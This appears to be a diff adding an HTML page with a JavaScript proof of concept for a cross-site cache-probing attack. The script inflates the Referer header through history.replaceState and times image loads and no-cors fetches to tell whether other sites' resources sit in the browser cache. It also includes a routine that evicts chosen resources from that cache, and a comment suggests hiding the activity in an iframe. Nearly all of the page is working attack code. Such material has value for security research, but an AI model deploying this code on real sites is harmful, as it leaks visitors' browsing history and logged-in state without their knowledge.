@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<body>
+    <script type="text/javascript">
+        // Create our giant referer header
+        // I recommend doing that in an iframe to increase performance and hide this activity.
+        try {
+            window.history.replaceState(1, 1, Array(16e4));
+        } catch (error) {
+            alert("Failed to manipulate referer!");
+        }
+
+        /**
+         * This is a dedicated function for checking whether or not a given image is in cache.
+         * 
+         * @param {String} url
+         * @param {Number} ms
+         * 
+         * @returns {Promise.<Boolean>}
+         */
+        window.imageInCache = (url, ms = 50) => new Promise(resolve => {
+            // We can abort requests taking over 50ms as they likely not to be served from cache.
+            let timeout = setTimeout(() => {
+                img.src = '';
+                resolve(false);
+            }, ms);
+
+            let img = new Image;
+
+            img.onload = () => {
+                clearTimeout(timeout);
+                resolve(true);
+            };
+
+            img.onerror = () => {
+                clearTimeout(timeout);
+                resolve(false);
+            };
+
+            img.src = url;
+        });
+
+        /**
+         * Checking whether or not a given resource is in cache.
+         * 
+         * @param {String} url
+         * 
+         * @returns {Promise.<Boolean>}
+         */
+        window.inCache = url => new Promise(async resolve => {
+            let controller = new AbortController();
+            // We can abort requests taking over 50ms as they likely not to be served from cache.
+            let timeout = setTimeout(() => controller.abort(), 50);
+
+            try {
+                // [!] Consider adding {cache: "force-cache"} as it seems useful in some cases.
+                await fetch(url, { signal: controller.signal, mode: 'no-cors' });
+                resolve(true);
+            } catch (error) {
+                resolve(false);
+            }
+
+            clearTimeout(timeout);
+        });
+
+        /**
+         * Evict an array of resources from the browser cache.
+         * 
+         * @param {Array} urls
+         * 
+         * @returns {Promise.<Boolean>}
+         */
+        window.evictAll = async urls => {
+            for (let i in urls) {
+                await window.evictCache(urls[i]);
+            }
+            return true;
+        };
+
+        /**
+         * Evict a given resource url from the browser cache.
+         * 
+         * @param {String} url
+         * @optional {Number} ms
+         * 
+         * @returns {Promise.<Boolean>}
+         */
+        window.evictCache = async (url, ms = 600) => {
+            let aborted = false;
+            let controller = new AbortController();
+
+            // Some server timeout due to our giant referrer header
+            let timeout = setTimeout(() => {
+                aborted = true;
+                controller.abort();
+            }, ms);
+
+            try {
+                await fetch(url, { signal: controller.signal, mode: 'no-cors', cache: 'reload' });
+            } catch (error) {
+                clearTimeout(timeout);
+
+                if (aborted) {
+                    // Automatically retries after a delay.
+                    return await window.evictCache(url, ms * 1.1);
+                }
+
+                // Since the request was not aborted and an error was triggered
+                // the resource was successfully cleared from the browser cache.
+                return true;
+            }
+        };
+    </script>
+</body>
+
+</html>
